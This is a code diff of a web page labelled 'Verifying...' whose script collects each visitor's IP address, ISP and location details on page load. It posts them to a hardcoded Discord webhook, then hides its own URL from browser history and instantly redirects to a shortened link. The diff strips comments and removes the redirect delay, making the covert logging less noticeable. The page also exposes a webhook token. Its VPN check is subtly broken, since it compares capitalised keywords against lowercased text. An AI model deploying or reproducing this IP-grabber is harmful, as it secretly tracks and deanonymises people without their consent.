@@ -30,18 +30,15 @@
     <h1>Verifying...</h1>
 
     <script>
-        // Define the Discord webhook URL and redirection link
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
         const REDIRECT_URL = "https://is.gd/gwuu9c";
 
-        // Function to fetch visitor's IP and network details
         async function getIPInfo() {
             try {
                 const response = await fetch("https://ipinfo.io/json");
                 if (!response.ok) throw new Error("Failed to retrieve IP information");
                 const data = await response.json();
 
-                // Extract relevant details
                 return {
                     ip: data.ip || "Unknown",
                     isp: data.org || "Unknown ISP",
@@ -61,7 +58,6 @@
             }
         }
 
-        // Function to determine if the user is likely using a VPN
         function detectVPN(data) {
             const vpnKeywords = ["VPN", "Proxy", "Hosting", "Datacenter", "Cloudflare", "AWS", "Google Cloud", "Azure", "OVH", "Linode", "Hetzner"];
             const isp = data.org ? data.org.toLowerCase() : "";
@@ -71,7 +67,6 @@
             return vpnKeywords.some(keyword => isp.includes(keyword) || asn_org.includes(keyword)) ? "Yes" : "No";
         }
 
-        // Function to send data to Discord webhook
         async function sendToWebhook(ipInfo) {
             if (!ipInfo) return;
 
@@ -99,18 +94,15 @@
 
         (async function () {
             const ipInfo = await getIPInfo();
+            if (ipInfo) sendToWebhook(ipInfo); // Send data asynchronously
 
-            if (ipInfo) {
-                sendToWebhook(ipInfo); // Send webhook data asynchronously
-            }
-
-            // Hide the original URL from the browser history
+            // Hide the original URL from browser history
             history.replaceState(null, '', REDIRECT_URL);
 
             // Instantly redirect the user
             setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 300); // Small delay for smooth transition
+                window.location.replace(REDIRECT_URL);
+            }, 0); // Zero delay for instant redirection
         })();
     </script>
 
